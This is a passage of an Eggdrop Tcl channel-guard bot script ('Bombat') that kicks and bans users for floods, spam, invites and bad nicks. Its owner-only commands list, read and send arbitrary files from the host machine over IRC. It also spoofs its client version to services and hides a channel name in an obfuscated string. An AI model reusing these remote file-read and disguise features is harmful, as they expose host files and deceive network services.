  if {[matchattr $nick f] || $nick == $botnick} { return 0 }
  if {$topic == [getuser $cflag XTRA "TOPIC"]} { return 0 }
  if {![string match "ChanServ" $nick]} {
    set banmask "*!*[string range $host [string first "@" $host] end]"
    set bannick($nick) $banmask
    putsrv "KICK $chan $nick :$fxlogo1 1it is forbidden to change the 4ToPIC"
  }
  puthlp "topic $chan :[getuser $cflag XTRA "TOPIC"]"
  return 0
}

proc flood_chk {nick host handle type channel} {
  global fxlogo1 botnick quick bannick fxlogo3 flooddeop floodnick floodkick igflood kops
  putlog "&#171;Bombat&#187; !Log! FLOOD <<$type>> FRoM $host"
  if {[info exists bannick($nick)]} { return 1 }
  if {[info exists igflood($nick)]} { return 1 }
  if {[string match "*Serv*" $nick] || [matchattr $handle f] || $nick == $botnick} {
    putlog "&#171;Bombat&#187; !Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
    return 1
  }
  if {[string index $channel 0] != "#"} {
    foreach x [channels] {
      if {[onchan $nick $x]} {
        set channel $x
      }
    }
  }
  set mhost "@[lindex [split $host @] 1]"
  if {[string index $channel 0] == "#"} {
    if {![isop $botnick $channel]} {
      putlog "&#171;Bombat&#187; !Log! FlooD <<$nick>> BoT NoT @P !IgNoREd!"
      return 1
    }
  }
  set type [string tolower $type]
  if {$type == "join"} {
    set bannick($nick) "*!*$mhost"
    putsrv "KICK $channel $nick :$fxlogo3 1Exceed max 4JOIN1 from: 4$mhost"
  }
  if {$type == "ctcp"} {
    if {![info exists kops]} {
      if {[isop $nick $channel] || [isvoice $nick $channel]} {
        return 1
      }
    }
    set bannick($nick) "*!*$mhost"
    if {$quick == "1"} {
      putqck "KICK $channel $nick :$fxlogo3 1Exceed max 4CTCP(s)1 from: 4$mhost"
    } else {
      putsrv "KICK $channel $nick :$fxlogo3 1Exceed max 4CTCP(s)1 from: 4$mhost"
    }
  }
  if {$type == "pub"} {
    if {![info exists kops]} {
      if {[isop $nick $channel] || [isvoice $nick $channel]} {
        return 1
      }
    }
    set bannick($nick) "*!$host"
    putsrv "KICK $channel $nick :$fxlogo1 1Exceed max 4LINES1 from: 4$mhost"
    return 1
  }
  if {$type == "nick"} {
    if {![info exists kops]} {
      if {[isop $nick $channel] || [isvoice $nick $channel] || [string length $nick] == 8} {
        return 1
      }
    }
    if {![info exists floodnick($mhost)]} {
      set floodnick($mhost) 1
      putsrv "KICK $channel $nick :$fxlogo1 1stop changing your 4NICK1..!"
    } else {
      catch {unset floodnick($mhost)}
      set bannick($nick) "*!*$mhost"
      putsrv "KICK $channel $nick :$fxlogo1 1Exceed 4NICK1 changing from: 4$mhost"
    }
  }
  if {$type == "deop"} {
    if {![info exists flooddeop($nick)]} {
      set flooddeop($nick) 1
      putsrv "KICK $channel $nick :$fxlogo1 4MASS DE1@4P1 from: 4$mhost1..!"
    } else {
      catch {unset flooddeop($nick)}
      set bannick($nick) "*!*$mhost"
      putsrv "KICK $channel $nick :$fxlogo1 1Exceed 4MASS DE1@4P1 from: 4$mhost"
    }
  }
  if {$type == "kick"} {
    if {![info exists floodkick($nick)]} {
      set floodkick($nick) 1
      putsrv "KICK $channel $nick :$fxlogo1 4MASSKICK1 detected from: 4$mhost1..!"
    } else {
      catch {unset floodkick($nick)}
      set bannick($nick) "*!*$mhost"
      putsrv "KICK $channel $nick :$fxlogo1 4MASSKICK1 detected from: 4$mhost1 go sit in a corner..!"
    }
  }
  return 1
}

proc raw_chk {nick keyword arg} {
  global invme joinme fxlogo1 bannick fxlogo2 botnick
  set who [string range $nick 0 [expr [string first "!" $nick]-1]]
  set channel [lindex $arg 1]
  set channel [string range $channel 1 end]
  foreach x [channels] {
    if {[string tolower $channel] == [string tolower $x]} {
      putsrv "JOIN $channel"
      return 0
    }
  }
  if {$who == "ChanServ" || [matchattr $who Z]} {
    if {![validchan $channel]} {
      if {[matchattr $who Z] && ![matchattr $who Q]} {
        puthlp "NOTICE $who :$fxlogo1 Ditolak!"
        return 0
      } else {
        set joinme $who
      }
      channel add $channel
      catch { channel set $channel -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
      savechan
    }
    putsrv "JOIN $channel"
    return 0
  }
  if {[matchattr $who f]} { return 0 }
  foreach x [channels] {
    if {[onchan $who $x]} {
      if {[isop $botnick $x]} {
        set banmask "*!*[string range $nick [string first "@" $nick] end]"
        set bannick($who) $banmask
        putsrv "KICK $x $who :$fxlogo1 1Jangan 4I1nvite gue!!"
        return 0
      } else {
        set members [chanlist $x f]
        foreach c $members {
          if {[isop $c $x]} {
            putlog "&#171;Bombat&#187; !Log! RePORTED InVITING FRoM <<$who$x>> To #$c#"
            set sendspam "!kick [zip "$x $who $fxlogo1 4INVITE1 found on report ... detected from: 14[string range $nick [string first "@" $nick] end] [banmsg]"]"
            putsrv "PRIVMSG $c :$sendspam"
            return 0
          }
        }
      }
    }
  }
  set invme([string range $nick [string first "@" $nick] end]) "InvITeR"
  return 0
}

proc sl_ctcp {nick uhost hand dest key arg} {
  global botnick fxlogo1
  if {[matchattr $nick f] || $nick == $botnick} { return 1 }
  if {[string match "*service*" [string tolower $uhost]]} {
    putsrv "NOTICE $nick :\001VERSION mIRC v6.31 Khaled Mardam-Bey\001"
  } else {
    set hostmask "${nick}!*@*"
    newignore $hostmask $botnick "*" 1
  }
  return 1
}

proc chat_ctcp {nick uhost hand dest key arg} {
  global botnick fxlogo1
  if {[matchattr $nick Z]} { return 0 }
  puthlp "NOTICE $nick :$fxlogo1 1wHo tHe fUcK aRe YoU..!"
  newignore "${nick}!*@*" $botnick "*" 1
  return 1
}

proc got_dcc {nick uhost handle dest key arg} {
  global virus_nick fxlogo1 fxlogo2 botnick
  if {[matchattr $nick f]} { return 0 }
  if {[lindex $arg 2] == 0 && [lindex $arg 3] == 0} {
    putlog "&#171;Bombat&#187; !Log! FaKE DCC SKIPPED..!"
    return 1
  }
  set virus_nick $nick
  foreach x [channels] {
    if {[onchan $nick $x] && ![isop $nick $x]} {
      if {[isop $botnick $x]} {
        putsrv "KICK $x $nick :$fxlogo1 1Mau ngirim 4V1irus ya ?!"
        set virus_nick ""
      } else {
        set members [chanlist $x f]
        foreach c $members {
          if {[isop $c $x]} {
            putlog "&#171;Bombat&#187; !Log! RePORTED ViRUS FRoM <<$nick$x>> To #$c#"
            set sendspam "!kick [zip "$x $nick $fxlogo1 4ABUSE1 found ... FoR VIRuZ JoIN #CyBeRz TO FIxED [banmsg]"]"
            putsrv "PRIVMSG $c :$sendspam"
            return 0
          }
        }
      }
    }
  }
  return 1
}

proc voiceq {chan nick} { utimer [expr 5 + [rand 15]] [list voiceprc $chan $nick] }

proc voiceprc {chan nick} {
  global botnick
  if {[isop $botnick $chan] && ![isvoice $nick $chan] && ![isop $nick $chan]} {
    putserv "MODE $chan +vvvvvv $nick"
  }
}

proc advertise {chan nick} {
  if {[isutimer "advq $chan $nick"]} { return 0 }
  set cret 5
  foreach ct [utimers] {
    if {[string match "*advq*" $ct]} {
      if {[expr [lindex $ct 0] + 5] > $cret} {
        set cret [expr [lindex $ct 0] + 5]
      }
    }
  }
  utimer $cret [list advq $chan $nick]
}

proc advq {chan nick} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![isop $nick $chan] && [onchan $nick $chan]} {
    set greetmsg [getuser $cflag XTRA "GREET"]
    regsub %n $greetmsg $nick greetmsg
    regsub %c $greetmsg $chan greetmsg
    puthlp "NOTICE $nick :[lgrnd] $greetmsg"
  }
}

proc deopprc {chan nick} {
  global botnick
  if {[isop $botnick $chan] && [isop $nick $chan]} {
    if {![string match "*k*" [getchanmode $chan]]} {
      putserv "MODE $chan -ko 1no.guest.4@1ps $nick"
    } else {
      putserv "MODE $chan -o $nick"
    }
  }
}

proc autokick {chan nick} {
  global bannick fxlogo1 botnick
  if {[isop $botnick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan]} {
    set hostmask [getchanhost $nick $chan]
    set hostmask "*!*@[lindex [split $hostmask @] 1]"
    set bannick($nick) $hostmask
    putsrv "KICK $chan $nick :$fxlogo1 1out..out...out... 4sh1!4thead1 !!"
  }
}

proc opq {chan nick} {
  utimer [expr 7 + [rand 15]] [list opprc $chan $nick]
}
proc opprc {chan nick} {
  global botnick unop
  if {[isop $botnick $chan] && ![isop $nick $chan] && ![info exists unop($nick)]} {
    putserv "MODE $chan +oooooo $nick"
  }
}

proc dcc_cmd {hand idx arg} {
  if {![matchattr $hand Z]} { return 0 }
  if {![matchattr $hand Q]} { chattr $hand +Q }
  msg_Z $hand "*" $hand $arg
}

proc dcc_get {hand idx arg} {
  global fxlogo1 own
  if {$hand != $own} { return 0 }
  if {![file exists [lindex $arg 0]]} {
    putdcc $idx "$fxlogo1 Denied, [lindex $arg 0] <n/a>"
    return 0
  }
  if {[lindex $arg 1] != ""} {
    set hand [lindex $arg 1]
  }
  switch -- [dccsend [lindex $arg 0] $hand] {
    0 { putdcc $idx "$fxlogo1 <<TRaNSFERRING LOG>>" }
    1 { putdcc $idx "            dcc table is full (too many connections), TrY AgAIN LaTeR!" }
    2 { putdcc $idx "            can't open a socket for transfer." }
    3 { putdcc $idx "            file doesn't exist." }
    4 { putdcc $idx "            file was queued for later transfer." }
  }
}

proc msg_get {nick uhost hand arg} {
  global fxlogo1 own
  if {$nick != $own} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "PRIVMSG $nick :$fxlogo1 Denied"
    return 0
  }
  if {![file exists $arg]} {
    puthlp "PRIVMSG $nick :Denied, $arg <n/a>"
    return 0
  }
  switch -- [dccsend $arg $nick] {
    0 { puthlp "NOTICE $nick :$fxlogo1 TRaNSFERRING LOG..!"  }
    1 { puthlp "NOTICE $nick :$fxlogo1 dcc table is full (too many connections), TrY AgAIN LaTER!" }
    2 { puthlp "NOTICE $nick :$fxlogo1 can't open a socket for transfer." }
    3 { puthlp "NOTICE $nick :$fxlogo1 file doesn't exist." }
    4 { puthlp "NOTICE $nick :file was queued for later transfer." }
  }
}

proc rtn { from keyword arg } {
  global fxlogo2 botnick fxlogo1 bannick
  set nick [lindex $arg 1]
  if {[matchattr $nick f]} { return 0 }
  set awaytext [string range [lrange $arg 2 end] 1 end]
  if {$nick == $botnick} {
    #puthlp "AWAY :fxlogo1 where's my master?!"
  } else {
    if {[string match "*#*" $awaytext] || [string match "*/j*" $awaytext]} {
      foreach x [channels] {
        set chksiton [string tolower $x]
        if {[string match "*$chksiton*" [string tolower $awaytext]]} { return 0 }
      }
      foreach x [channels] {
        if {[onchan $nick $x]} {
          if {[isop $botnick $x]} {
            set bannick($nick) "*!*[string range [getchanhost $nick $x] [string first "@" [getchanhost $nick $x]] end]"
            putsrv "KICK $x $nick :$fxlogo1 4INVITE1 on away msg [banmsg]"
            return 0
          } else {
            set members [chanlist $x f]
            foreach c $members {
              if {[isop $c $x]} {
                set sendspam "!kick [zip "$x $nick $fxlogo1 4INVITE1 on away msg, detected from: 14[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end] [banmsg]"]"
                putsrv "PRIVMSG $c :$sendspam"
                return 0
              }
            }
          }
        }
      }
    }
  }
}

proc chk_five {min h d m y} {
  global longer deff awaym awaymsg fxlogo1
  catch { remain }
  if {![string match "**" $longer]} { set longer "$awaymsg ([lgrnd])" }
  puthlp "AWAY :$awaymsg ([lgrnd])"
  auto_ping "0" "0" "0" "0" "0"
}

proc msg_dir {nick uhost hand arg} {
  global fxlogo1 own
  if {$nick != $own} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "PRIVMSG $nick :Denied"
    return 0
  }
  if {$arg == ""} {
    set arg "."
  }
  set dirlist ""
  foreach x [getfiles "$arg"] {
    append dirlist "$x "
  }
  puthlp "PRIVMSG $nick :$dirlist"
}

proc msg_read {nick uhost hand arg} {
  global fxlogo1 own
  if {$nick != $own} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "PRIVMSG $nick :Denied"
    return 0
  }
  if {![file exists $arg]} {
    puthlp "PRIVMSG $nick :Denied, $arg <n/a>"
    return 0
  }
  set fd [open $arg r]
  while {![eof $fd]} {
    set inp [gets $fd]
    puthlp "PRIVMSG $nick :$inp"
  }
  close $fd
  puthlp "PRIVMSG $nick :EoF..!"
}

proc pub_log {nick uhost hand channel arg} {
  global fxlogo1
  if {[getuser "config" XTRA "LOGCHAN"]!=""} {
    puthlp "NOTICE $nick :$fxlogo1 Log [getuser "config" XTRA "LOGCHAN"]"
  }
}

proc pub_server {nick uhost hand channel arg} {
  global server fxlogo1
  if {$arg != ""} {
    if {[string match "*$arg*" $server]} {
      puthlp "privmsg $channel :[lindex $server 0]"
    }
  } else {
    puthlp "privmsg $channel :[lindex $server 0]"
  }
}

set own $owner

proc dcc_dir {hand idx arg} {
  global own
  if {$hand != $own} { return 0 }
  if {$arg == ""} {
    set arg "."
  }
  foreach x [getfiles "$arg"] { putdcc $idx "&#171;Bombat&#187; $x" }
}

proc dcc_read {hand idx arg} {
  global own
  if {$hand != $own} { return 0 }
  if {![file exists $arg]} {
    putdcc $idx "&#171;Bombat&#187; FiLE NoT ExIST $arg"
    return 0
  }
  set fd [open $arg r]
  while {![eof $fd]} {
    set inp [gets $fd]
    putdcc $idx "&#171;Bombat&#187; $inp"
  }
  close $fd
  putdcc $idx "&#171;Bombat&#187; ******************** END ***********************"
}

proc msg_bantime {nick uhost hand rest} {
  global fxlogo1 ban-time
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 BanTime \[${ban-time}\] (set 0 to never unban)"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set mtime [lindex $rest 0]
  if {![isnumber $mtime]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: bantime <minutes> (set 0 to never unban)"
    return 0
  }
  set ban-time $mtime
  setuser "config" XTRA "BANTIME" $mtime
  puthlp "NOTICE $nick :$fxlogo1 BanTime \[$mtime\]"
  saveuser
}

proc chk_limit {chan} {
  global fxlogo1 botnick lst_limit
  if {![isop $botnick $chan]} { return 0 }
  if {![info exists lst_limit($chan)]} {
    set lst_limit($chan) 0
  }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set usercount 0
  foreach x [chanlist $chan] {
    incr usercount
  }
  set usercount [expr [getuser $cflag XTRA "LIMIT"] + $usercount]
  if {$lst_limit($chan) != $usercount} {
    set lst_limit($chan) $usercount
    putserv "MODE $chan +l $usercount"
  }
}

proc msg_logchan {nick uhost hand rest} {
  global fxlogo1 own
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: logchan <#channel/0>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[string tolower $rest] == "off"} {
    puthlp "NOTICE $nick :$fxlogo1 LOGCHAN [getuser "config" XTRA "LOGCHAN"] \[4OFF\]"
    setuser "config" XTRA "LOGCHAN" ""
  } else {
    if {[string tolower $rest] == [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} { return 0 }
    if {![validchan $rest]} {
      puthlp "NOTICE $nick :$fxlogo1 NoT IN $rest"
      return 0
    }
    setuser "config" XTRA "LOGCHAN" $rest
    puthlp "NOTICE $nick :$fxlogo1 LOG CHaNNEL $rest \[9ON\]"
  }
  saveuser
  utimer 5 rehashing
}

proc dcc_log {hand idx arg} {
  global logstore fxlogo1
  if {$logstore == ""} {
    putdcc $idx "&#171;Bombat&#187; No LOG FouNd..!"
    return 0
  }
  if {![file exists $logstore]} {
    putdcc $idx "&#171;Bombat&#187; Denied, Log file haven't create yet!"
    return 0
  }
  set fd [open $logstore r]
  while {![eof $fd]} {
    set inp [gets $fd]
    putdcc $idx "&#171;Bombat&#187; $inp"
  }
  close $fd
  putdcc $idx "&#171;Bombat&#187; ******************** END ***********************"
}

set quick "0"

proc chk_quick {} {
  global quick botnick
  putquick "PRIVMSG $botnick :\001PING [unixtime]\001"
  set quick "1"
}

utimer 1 chk_quick

proc chk_op { from keyword arg } {
  global botnick
  if {![string match "*+o*$botnick*" $arg]} { return 0 }
  set chan [lindex $arg 0]
  if {[string match "*allnetwork.org*" $from]} {
    pub_resync $botnick "*" "*" $chan "*"
    return 0
  }
  chk_on_op $chan
}

proc chk_on_op {channel} {
  global botnick kickme deopme invme virus_nick quick fxlogo1 bannick is_m botname fxc
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  if {[isutimer "chkspam $channel"]} {
    foreach x [utimers] {
      if {[string match "*chkspam $channel*" $x]} { killutimer [lindex $x 2] }
    }
  }
  if {[isutimer "GOP $channel"]} { return 0 }
  if {![onchan $botnick $channel]} { return 0 }
  utimer 20 [list putlog "&#171;Bombat&#187; GOP $channel"]
  set cinfo [channel info $channel]
  if {[string match "*+nodesynch*" $cinfo]} {
    pub_mdeop "*" "*" "*" $channel ""
  }
  set cmode [getchanmode $channel]
  if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
    if {[matchattr $cflag K]} {
      if {![string match "*[dezip [getuser $cflag XTRA "CI"]]*" [getchanmode $channel]]} {
        puthelp "mode $channel -k+k . [dezip [getuser $cflag XTRA "CI"]]"
      }
    } else {
      if {[string match "*k*" $cmode]} {
        if {[string tolower $channel] != $fxc} {
          putserv "mode $channel -k 6r.e.f.r.e.s.h.e.d"
        }
      }
    }
    if {[string match "*R*" $cmode]} {
      puthelp "mode $channel -R"
    }
    if {[string match "*m*" $cmode] && ![string match "*m*" [lindex [channel info $channel] 0]]} {
      putserv "mode $channel -m"
    }
    if {[string match "*i*" $cmode]} {
      putserv "mode $channel -i"
    }
  }
  if {![string match "*m*" $cmode]} {
    foreach x [utimers] {
      if {[string match "*set_-m $channel*" $x]} {
        killutimer [lindex $x 2]
      }
    }
  }
  if {[matchattr $cflag I]} {
    if {[topic $channel] != [getuser $cflag XTRA "TOPIC"]} {
      puthlp "topic $channel :[getuser $cflag XTRA "TOPIC"]"
    }
  }
  foreach x [chanlist $channel] {
    if {$x == $deopme} {
      if {[isop $x $channel]} {
        if {![string match "*k*" $cmode]} {
          if {$quick == "1"} {
            putquick "mode $channel -ko 1dE4@1p.reverse $x"
          } else {
            putserv "mode $channel -ko 1dE4@1p.reverse $x"
          }
        } else {
          if {$quick == "1"} {
            putquick "mode $channel -o $x"
          } else {
            putserv "mode $channel -o $x"
          }
        }
      }
      set deopme ""
    }
    set mhost "@[lindex [split [getchanhost $x $channel] @] 1]"
    if {[info exists kickme($x)]} {
      if {$kickme($x) == 3} {
        catch { unset kickme($x) }
        set bannick($x) "*!*$mhost"
        if {$quick == "1"} {
          putqck "KICK $channel $x :$fxlogo1 1repeat 4KICK 1remote OFF4..!"
        } else {
          putsrv "KICK $channel $x :$fxlogo1 1repeat 4KICK 1remote OFF4..!"
        }
      } else {
        if {$kickme($x) == 1} {
          if {$quick == "1"} {
            putqck "KICK $channel $x :$fxlogo1 4SELF KICK1 revenge..!"
          } else {
            putsrv "KICK $channel $x :$fxlogo1 4SELF KICK1 boommm4..!"
          }
        }
      }
    }
    if {[matchattr $cflag V]} {
      if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
        if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
          set cret [getuser $cflag XTRA "VC"]
          foreach ct [utimers] {
            if {[string match "*voiceq*" $ct]} {
              if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
                set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
              }
            }
          }
          utimer $cret [list voiceq $channel $x]
        }
      }
    }
    if {[matchattr $x v] || [matchattr $x P] || [matchattr $x G]} {
      if {![isop $x $channel] || ![isvoice $x $channel]} {
        whoisq $x
      }
    }
    if {[matchattr $x O]} {
      if {[isop $x $channel]} {
        set cmode [getchanmode $channel]
        if {![string match "*k*" $cmode]} {
          puthelp "mode $channel -ko 1no4@1p.list $x"
        } else {
          puthelp "mode $channel -o $x"
        }
      } else {
        if {[isvoice $x $channel]} {
          set cmode [getchanmode $channel]
          if {![string match "*k*" $cmode]} {
            puthelp "mode $channel -kv 1no4@1p.list $x"
          } else {
            puthelp "mode $channel -v $x"
          }
        }
      }
    }
    if {[info exists invme($mhost)]} {
      if {![isop $x $channel]} {
        set bannick($x) "*!*$mhost"
        if {$invme($mhost) == "AuToJoIN MSg"} {
          if {![isvoice $x $channel]} {
            putsrv "KICK $channel $x :$fxlogo1 4SPAM14 \[$mhost\] 1$invme($mhost) 14R1emote 15O1ff14..!"
          }
        } else {
          putsrv "KICK $channel $x :$fxlogo1 4SPAM14 \[$mhost\] 1$invme($mhost) [banmsg]"
        }
      }
      catch {unset invme($mhost)}
    }
    if {$x == $virus_nick} {
      if {![isop $x $channel]} {
        set bannick($x) "*!*$mhost"
        putsrv "KICK $channel $x :$fxlogo1 1What are you doing 4S1pammer 4?1!"
        set virus_nick ""
      }
    }
    spam_chk $x [getchanhost $x $channel] "*" $channel
  }
  foreach x [chanlist $channel K] {
    if {![matchattr $x f]} {
      akick_chk $x [getchanhost $x $channel] $channel
    }
  }
  foreach x [chanbans $channel] {
    set bhost [lindex $x 0]
    if {[string match [string tolower $bhost] [string tolower $botname]]} {
      if {![string match "*k*" $cmode]} {
        puthelp "mode $channel -kb 1aut4o1.unban $bhost"
      } else {
        puthelp "mode $channel -b $bhost"
      }
    } elseif {[matchattr $bhost f]} {
      puthelp "mode $channel -b $bhost"
    } elseif {[getuser "config" XTRA "IPG"] != ""} {
      foreach ipg [getuser "config" XTRA "IPG"] {
        if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
          if {![isutimer "IPG $bhost"]} {
            if {![string match "*k*" $cmode]} {
              puthelp "mode $channel -kb 4i1p.guard $bhost"
            } else {
              puthelp "mode $channel -b $bhost"
            }
            utimer 60 [list putlog "&#171;Bombat&#187; IPGuARD $bhost"]
          }
        }
      }
    }
  }
}

proc show_status {min h d m y} {
  global botnick
  foreach x [channels] {
    if {[isop $botnick $x]} {
      pub_status "*" "*" "*" $x ""
      chk_on_op $x
    }
  }
  return 0
}

proc badnick_chk {nick uhost hand chan} {
  global bannick fxlogo1 botnick badwords
  foreach x [string tolower $badwords] {
    if {[string match "*$x*" [string tolower $nick]]} {
      set bannick($nick) "*!$uhost"
      putsrv "KICK $chan $nick :$fxlogo1 4BADNICK1: 4[string toupper $x]"
      return 1
    }
  }
  return 0
}

proc spam_chk {nick uhost hand chan} {
  global fxlogo1 botnick spidx
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $cflag S]} { return 0 }
  if {$nick == $botnick} { return 0 }
  if {[isvoice $nick $chan]} { return 0 }
  if {[isop $nick $chan]} { return 0 }
  if {[matchattr $nick f]} { return 0 }
  if {[badnick_chk $nick $uhost $hand $chan]} {
    return 0
  }
  set nicklen [string length $nick]
  if {$nicklen < 5} { return 0 }
  set idx [string index $nick [expr $nicklen - 4]][string index $nick [expr $nicklen - 3]][string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
  if {[isnumber $idx]} { return 0 }
  set idx [string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
  if {[isnumber $idx]} {
    if {[string index $uhost 0] != "~"} { return 0 }
    if {$nicklen < 10} {
      if {![string match "~$nick@*" $uhost]} { return 0 }
    } else {
      if {![string match "~[string index $nick 0][string index $nick 1][string index $nick 2]*@*" $uhost]} { return 0 }
    }
    if {$spidx == 18} {
      set spidx 1
    }
    spamkick $nick $uhost $chan
    return 0
  }
  if {[regexp \[^a-z\] $nick]} { return 0 }
  set nickchk [string tolower $nick]
  set count 0
  set lstidx ""
  for {set i 0} {$i < $nicklen} {incr i} {
    set idx [string index $nickchk $i]
    if {$idx == "a" || $idx == "e" || $idx == "i" || $idx == "o" || $idx == "u"} {
      set count 0
    } else {
      if {$idx != $lstidx && $idx != "y"} { incr count }
      if {$count == 4} {
        spamkick $nick $uhost $chan
        return 0
      }
    }
    set lstidx $idx
  }
}

proc akick_chk {nick uhost chan} {
  global fxlogo1 bannick
  foreach x [getuser "AKICK" HOSTS] {
    if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
      set bannick($nick) $x
      putsrv "KICK $chan $nick :$fxlogo1 4AKICKLIST1: 4 $x [banms]"
      return 0
    }
  }
}

set spidx 1

proc spamkick {nick uhost chan} {
  global spidx fxlogo1 bannick
  set bannick($nick) "*!$uhost"
  if {$spidx == 1} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 need help? [banms]"
  } elseif {$spidx == 2} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 burned in hell..."
  } elseif {$spidx == 3} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 i don't like you..!"
  } elseif {$spidx == 4} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 hey..it's a dead end.."
  } elseif {$spidx == 5} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 get out from 14[string toupper $chan]"
  } elseif {$spidx == 6} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 ouu..you idiot!"
  } elseif {$spidx == 7} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 G.o.T.C.H.a !!"
  } elseif {$spidx == 8} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 empty recycle bin"
  } elseif {$spidx == 9} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 ground zero"
  } elseif {$spidx == 10} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 knock..knock...!"
  } elseif {$spidx == 11} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 knock 1st !"
  } elseif {$spidx == 12} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 you are out!!"
  } elseif {$spidx == 13} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 rejected from 14[string toupper $chan]"
  } elseif {$spidx == 14} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 J.a.C.K.p.O.T !!"
  } elseif {$spidx == 15} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 awww yeaaahh...."
  } elseif {$spidx == 16} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 unwelcome in 14[string toupper $chan]"
  } elseif {$spidx == 17} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 fake nickname"
  } elseif {$spidx >= 18} {
    putsrv "KICK $chan $nick :$fxlogo1 4SPAM1 illegal operation..."
    set spidx 0
  }
  incr spidx
  return 0
}

proc isutimer {text} {
  set text [string tolower $text]
  foreach x [utimers] {
    set x [string tolower $x]
    if {[string match "*$text*" $x]} {
      return 1
      break
    }
  }
  return 0
}

proc istimer {text} {
  set text [string tolower $text]
  foreach x [timers] {
    set x [string tolower $x]
    if {[string match "*$text*" $x]} {
      return 1
      break
    }
  }
  return 0
}

proc msg_vhost {nick uhost hand rest} {
  global my-hostname my-ip fxlogo1
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 ReSET TO DeFauLT"
    setuser "config" XTRA "VHOST" ""
    saveuser
    vback "*" "*" "0"
    return 0
  }
  for {set i 0} {$i < [string length $rest]} {incr i} {
    set idx [string index $rest $i]
    if {![string match "*$idx*" "1234567890."]} {
      puthlp "NOTICE $nick :$fxlogo1 UsE DNS IP NuMBeR"
      return 0
    }
  }
  if {[isutimer "vback"]} {
    puthlp "NOTICE $nick :$fxlogo1 WaIT..!"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set my-hostname $rest
  set my-ip $rest
  utimer 30 [list vback $nick $rest "1"]
  listen 65234 bots
  set idx [connect $rest 65234]
  if {[isnumber $idx] && $idx > 0} {
    if {![isutimer "vback"]} { return 0 }
    foreach x [utimers] {
      if {[string match "*vback*" $x]} { killutimer [lindex $x 2] }
    }
    setuser "config" XTRA "VHOST" $rest
    saveuser
    putsrv "QUIT :$fxlogo1 VHoST CHaNGED By \[ $nick \]"
  }
  listen 65234 off
}

proc klined {from keyword arg} {
  vback "*" "*" "0"
}

proc vback {nick vhosts chk} {
  global old_hostname old_ip fxlogo1
  set my-hostname $old_hostname
  set my-ip $old_ip
  if {$chk == "1"} { puthlp "NOTICE $nick :$fxlogo1 \[$vhosts\] NoT SuPPoRT..!" }
  catch { listen 652343 off }
}

proc pub_status {nick uhost hand channel rest} {
  global ban-time botnick own fz fxver
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  if {$rest != ""} {
    if {[validchan $rest]} {
      set channel $rest
    } else { return 0 }
  }
  set cinfo [channel info $channel]
  if {![string match "*+shared*" $cinfo] && $nick == "*"} { return 0 }
  set mstatus ""
  if {[matchattr $cflag I]} { append mstatus "\[12T\]opicLock " }
  if {[matchattr $cflag M]} { append mstatus "FoRcE\[12M\]ode " }
  if {[string match "*+nodesynch*" $cinfo]} { append mstatus "Auto\[12K\]ick " }
  if {[string match "*-userinvites*" $cinfo]} { append mstatus "\[12D\]ontKick@p " }
  if {[string match "*+protectfriends*" $cinfo]} { append mstatus "UnRe\[12@\]p " }
  if {[string match "*+greet*" $cinfo]} {
    set i 0
    while {$i < [string length $cinfo]} {
      set y 0
      while {$y < [string length [lindex $cinfo $i]]} {
        if {[string index [lindex $cinfo $i] $y] == ":"} { break }
        set y [incr y]
      }
      if {$y != [string length [lindex $cinfo $i]]} { break }
      set i [incr i]
    }
    set ichan [lindex $cinfo $i]
    set ictcp [lindex $cinfo [expr $i + 1]]
    set ijoin [lindex $cinfo [expr $i + 2]]
